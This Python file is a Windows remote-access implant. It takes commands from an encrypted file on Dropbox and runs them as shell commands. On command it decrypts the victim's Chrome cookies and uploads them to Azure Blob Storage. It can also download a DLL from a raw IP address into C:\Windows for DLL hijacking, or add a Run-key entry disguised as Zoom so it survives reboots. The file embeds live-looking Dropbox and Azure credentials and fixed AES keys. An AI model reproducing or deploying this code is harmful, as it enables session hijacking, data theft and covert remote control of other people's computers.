# Import necessary libraries and modules including those for interacting with cloud services, encryption, OS interaction, and web requests.
import dropbox
import subprocess
import time
import random
import sqlite3
import json
import winreg
import os
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from base64 import b64decode
from Cryptodome.Cipher.AES import new, MODE_GCM
from win32.win32crypt import CryptUnprotectData
from azure.storage.blob import BlobServiceClient
from datetime import datetime
from pathlib import Path

# Function to encrypt a message using AES-128 in CBC mode
def encrypt_message(message):
    cipher = AES.new(key, AES.MODE_CBC, IV=CONST_IV)
    ct_bytes = cipher.encrypt(pad(message, AES.block_size))
    return ct_bytes

# Function to decrypt a message using AES-128 in CBC mode
def decrypt_message(ct_bytes):
    cipher = AES.new(key, AES.MODE_CBC, iv=CONST_IV)
    pt = unpad(cipher.decrypt(ct_bytes), AES.block_size)
    return pt.decode()

# Utility function to format the combination of host key, cookie name, and value into a single string
def merge(host_key, name, value):
    return f"{host_key} -> {name}: {value}" 

# Function to decrypt encrypted values using AES in GCM mode
def decrypt_value(key, encrypted_value):
    try:
        return new(key, MODE_GCM, encrypted_value[3:15]).decrypt(encrypted_value[15:-16]).decode()
    except Exception as e:
        print(f"Error decrypting value: {e}")
        return None

# Function to extract, decrypt, and save Chrome browser cookies to a text file
def get_chrome_cookies(db=None, output_file="chrome_cookies.txt"):
    if db is None:
        from os.path import expandvars
        db = expandvars('C:/Users/john/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies')

    try:
        with open(db + '/../../../Local State') as f:
            key = CryptUnprotectData(b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:])[1]
    except (FileNotFoundError, KeyError, ValueError) as e:
        print(f"Error reading Local State file: {e}")
        return {}

    try:
        conn = sqlite3.connect(db)
        conn.create_function('decrypt', 2, decrypt_value)
        conn.create_function('merge', 3, merge)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, decrypt(?, encrypted_value) FROM cookies ORDER BY host_key", (key,))
        rows = cursor.fetchall()
        
        cookies = {}
        for row in rows:
            host_key, name, value = row
            key = f"{host_key} -> {name}"
            cookies[key] = value
        
        with open(output_file, "w") as file:
            for host_and_name, cookie in cookies.items():
                file.write(f"{host_and_name}: {cookie}\n")
        
        print(f"Decrypted cookies written to '{output_file}'")
        return cookies
        
    except sqlite3.Error as e:
        print(f"Error accessing Chrome cookies database: {e}")
        return {}

# Placeholder for future implementation of Firefox cookies handling
def get_firefox_cookies():
    pass

# Function to exfiltrate Chrome cookies data to Azure Blob Storage
def exfil():
    cookies = get_chrome_cookies()
    connection_string = "DefaultEndpointsProtocol=https;AccountName=ops10101;AccountKey=I35Mk/My6QLuP86/xBhsi/2IQCvgO4Lh4bj5rjUAoW5drKHsXBpeFtm19x4i8mD0WKCE+LkbQFAH+AStx0oOog==;EndpointSuffix=core.windows.net"
    container_name = "test324"

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    file_azure = f"chrome_azure_{timestamp}"
    file_local = "chrome_cookies.txt"

    try:
        blob_service_client = BlobServiceClient.from_connection_string(connection_string)
        blob_client = blob_service_client.get_blob_client(container=container_name, blob=file_azure)
        with open(file_local, "rb") as data:
            blob_client.upload_blob(data)
        print("[+] Uploaded " + file_local)
        write_output(b"Cookies File Uploaded to Azure")
    except Exception as e:
        write_output(b"Failed uploading to Azure")
        print(e)

# Function to download and persist a DLL for maintaining persistence on the machine
def persist_dll():
    dll_url = "http://3.21.21.191/cscapi.dll"
    windows_path = Path("C:/Windows")
    file_name = "cscapi.dll"
    save_path = windows_path / file_name

    response = requests.get(dll_url)
    try:
        if response.status_code == 200:
            with open(save_path, 'wb') as file:
                file.write(response.content)
            print("DLL downloaded successfully.")
            write_output(b"Persistance Achieved")
    except Exception as e:
        print(f"e")
        write_output(b'DLL Hijacking Failed, try again!!')



def persist_reg():
    try:
        key_name = "Zoom.exe"  
        executable_path = r"C:\Windows\Temp\zoom.exe"   # replace the path with drop location

        # Open the registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        write_output(b'Persistence Achieved')
        print("Startup entry added successfully.")
    except Exception as e:
        write_output(b'Failed adding registry key')
        print("An error occurred:", e)

def clean_up():
    pass
    

# Function to execute a command received from the command and control server
def execute(command):
    print('[+] Successfully read command from Dropbox file')
    print(f'Command from C2 -> {command}')
    command = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()
    print(f'Output -> {output}')
    write_output(output)

# Function to write the command execution output to Dropbox, managing command responses
def write_output(output):
    prev_output = output
    output = encrypt_message(output)
    dbx.files_upload(output, dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
    print("[+] Response written to Dropbox file")
    check_new_command(prev_output)

# Function to continuously check for new commands from the command and control server
def check_new_command(prev_output):
    while True:
        _, response = dbx.files_download(dropbox_path)
        new_command = decrypt_message(response.content)
        if new_command == prev_output.decode():
            print('[-] No new commands from C2')
            n = random.randint(5,10)
            time.sleep(n)
        elif new_command == 'exit':
            clean_up()
            exit(0)
        elif new_command == 'get_cookies':
            exfil()

        elif new_command == 'persist_reg':
            persist_reg()

        elif new_command == 'persist_dll':
            persist_dll()
        
        elif new_command.split(" ")[0] == 'cd':
            try:
                directory = str(new_command.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed to {cur_dir}')
                dir_resp = 'Changed to ' + cur_dir
                write_output(dir_resp.encode())
            except Exception as e:
                write_output(e)
        else:
            execute(new_command)


# Entry point of the Python script. It checks if the script is run as the main program and not imported as a module.
if __name__ == '__main__':
    # Hardcoded encryption key for AES operations. Encoded to bytes since AES operations require byte data.
    key = "564cybereffectss".encode()
    
    # Hardcoded Initialization Vector for AES. Also encoded to bytes.
    CONST_IV = 'qwertyuiopasdfgh'.encode()

    # Dropbox token
    token = "sl.Bz--6Bn-VLUuToNivoPDz9Q8LTT-AWRSBRmYUAMh8fQEDGJp2DmTOf-ILf7CwDg0iWsTFk_3o4H3VD4hQzEngpolAEVjdDBopAwqv0xgi1ssfwS1htYK_HRaViJLF1i9J2UVgY308EyooO5NnyGw"

    dbx = dropbox.Dropbox(token)
    
    # Path in Dropbox where commands are stored. This script reads its commands from this file.
    dropbox_path = '/c2/payload.txt'
    
    # Variable to keep track of the previous command processed (unused in this snippet but potentially useful for command tracking).
    prev_command = None
    
    # Writes the initial message indicating the client has started, to the Dropbox file specified by `dropbox_path`.
    write_output(b"Client Started")
    
    # Download the current command from the Dropbox server. The underscore is used to ignore the metadata returned by files_download.
    _, response = dbx.files_download(dropbox_path)
    
    # Decrypt the command retrieved from Dropbox to get the actual command to be executed.
    command = decrypt_message(response.content)
    
    # Execute the decrypted command using the execute function.
    execute(command)
